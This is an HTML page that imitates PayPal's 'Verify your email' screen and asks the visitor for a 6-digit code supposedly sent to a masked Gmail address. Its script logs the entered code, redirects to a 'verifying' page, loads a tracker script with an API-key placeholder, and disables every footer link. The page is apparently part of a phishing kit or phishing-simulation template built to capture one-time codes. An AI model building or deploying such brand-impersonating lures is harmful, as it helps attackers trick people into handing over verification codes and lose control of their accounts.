<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verify your email - PayPal</title>
    <link rel="stylesheet" href="assets/css/styles.css">
    <link rel="icon" type="image/svg+xml" href="assets/images/favicon.svg">

<script src="/tracker.js" data-api-key="%%API_KEY%%"></script>
</head>
<body>
    <main class="container">
        <div class="login-card">
            <div class="logo">
                <svg width="101" height="32" viewBox="0 0 101 32" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <g clip-path="url(#clip0)">

                    </g>
                </svg>
            </div>

            <div class="page-header">
                <h1 class="page-title">Verify your email</h1>
                <p class="page-description">Enter the 6-digit code we sent to j••••n@gmail.com</p>
            </div>

            <form class="login-form" id="emailForm" novalidate>
                <div class="form-group">
                    <input 
                        type="text" 
                        id="emailCode" 
                        name="emailCode"
                        class="form-input code-input" 
                        placeholder="Enter 6-digit code"
                        maxlength="6"
                        pattern="[0-9]{6}"
                        autocomplete="one-time-code"
                        required
                    >
                    <label for="emailCode" class="form-label">Enter 6-digit code</label>
                </div>

                <button type="submit" class="btn btn-primary">Continue</button>

                <div class="separator">
                    <span>or</span>
                </div>

                <button type="button" class="btn btn-secondary" id="resendEmailBtn">Resend Email</button>
                
                <div class="help-links">
                    <a href="#" class="link">Didn't receive the email?</a>
                </div>
            </form>
        </div>
    </main>

    <footer class="footer">
        <a href="#" class="footer-link">Contact Us</a>
        <a href="#" class="footer-link">Privacy</a>
        <a href="#" class="footer-link">Legal</a>
        <a href="#" class="footer-link">Policy Updates</a>
        <a href="#" class="footer-link">Worldwide</a>
    </footer>

    <script>
        const emailForm = document.getElementById('emailForm');
        const emailCodeInput = document.getElementById('emailCode');
        const resendEmailBtn = document.getElementById('resendEmailBtn');

        emailCodeInput.addEventListener('input', (e) => {
            e.target.value = e.target.value.replace(/\D/g, '');
            emailCodeInput.classList.remove('error');
        });

        emailForm.addEventListener('submit', async (e) => {
            e.preventDefault();
            
            const code = emailCodeInput.value.trim();
            
            if (code.length !== 6) {
                emailCodeInput.classList.add('error');
                return;
            }
            
            const submitButton = emailForm.querySelector('.btn-primary');
            submitButton.classList.add('loading');
            submitButton.disabled = true;
            
            await new Promise(resolve => setTimeout(resolve, 1000));
            
            console.log('Email Code entered:', code);
            window.location.href = 'verifying.html';
        });

        resendEmailBtn.addEventListener('click', () => {
            alert('A new verification email has been sent.');
            resendEmailBtn.disabled = true;
            resendEmailBtn.textContent = 'Email Sent';
            
            setTimeout(() => {
                resendEmailBtn.disabled = false;
                resendEmailBtn.textContent = 'Resend Email';
            }, 30000);
        });

        document.querySelectorAll('.footer-link, .help-links .link').forEach(link => {
            link.addEventListener('click', (e) => {
                e.preventDefault();
            });
        });
    </script>
</body>
</html>
